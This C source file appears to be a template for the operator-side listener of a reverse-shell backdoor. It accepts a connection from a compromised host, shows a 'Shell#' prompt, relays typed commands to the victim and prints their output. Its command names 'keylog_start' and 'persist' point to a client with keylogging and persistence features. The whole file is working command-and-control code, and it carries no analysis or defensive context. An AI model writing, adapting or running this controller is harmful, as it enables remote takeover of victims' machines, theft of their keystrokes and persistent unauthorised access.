#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main()
{
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int optval = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        printf("Error Setting TCP Socket Options!\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY; 
    server_address.sin_port = htons({lport});

    if (bind(sock, (struct sockaddr *) &server_address, sizeof(server_address)) < 0) {
        printf("Error Binding Socket!\n");
        return 1;
    }

    if (listen(sock, 5) < 0) {
        printf("Error Listening on Socket!\n");
        return 1;
    }

    printf("Server listening on port {lport}\n");

    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

    if (client_socket < 0) {
        printf("Error Accepting Connection!\n");
        return 1;
    }

    printf("Client connected: %s\n", inet_ntoa(client_address.sin_addr));

    while (1)
    {
        jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");
        write(client_socket, buffer, sizeof(buffer));
        if (strncmp("q", buffer, 1) == 0) {
            break;
        }
        else if (strncmp("cd ", buffer, 3) == 0) {
            goto jump;
        }
        else if (strncmp("keylog_start", buffer, 12) == 0) {
            goto jump;
        }
        else if (strncmp("persist", buffer, 7) == 0) {
            recv(client_socket, response, sizeof(response), 0);
            printf("%s", response);
        }
        else {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }

    }

    close(client_socket);
    close(sock);
    return 0;
}
